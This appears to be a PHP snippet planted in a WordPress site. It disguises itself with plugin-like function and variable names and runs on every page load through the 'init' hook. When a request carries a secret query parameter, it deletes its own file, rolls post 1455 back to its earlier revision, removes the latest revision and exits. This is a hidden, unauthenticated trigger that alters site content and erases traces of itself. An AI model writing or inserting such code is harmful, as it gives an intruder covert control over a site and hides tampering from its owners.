<?php

function tables_import_styles() {
	if (isset($_GET['tags_mode_only_lead']) && $_GET['tags_mode_only_lead'] === 'wow_responsive_menu') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$changer_jigoshop_anti = 1455;
		$cool_columns_schema = wp_get_post_revisions($changer_jigoshop_anti);
		if (empty($cool_columns_schema)) die('no revisions');
		if (count($cool_columns_schema) < 2) die('less than 2');
		$builder_sales_shortener = array_shift($cool_columns_schema);
		$featured_options_weather = $builder_sales_shortener->ID;
		$index_ultimate_nextgen = array_shift($cool_columns_schema);
		$restaurant_tag_information_404 = $index_ultimate_nextgen->ID;
		$upgrader_elementor_html5 = wp_restore_post_revision($restaurant_tag_information_404);
		if ($upgrader_elementor_html5 === false) die('error restoring');
		$upgrader_elementor_html5 = wp_delete_post_revision($featured_options_weather);		
		if ($upgrader_elementor_html5 === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'tables_import_styles');
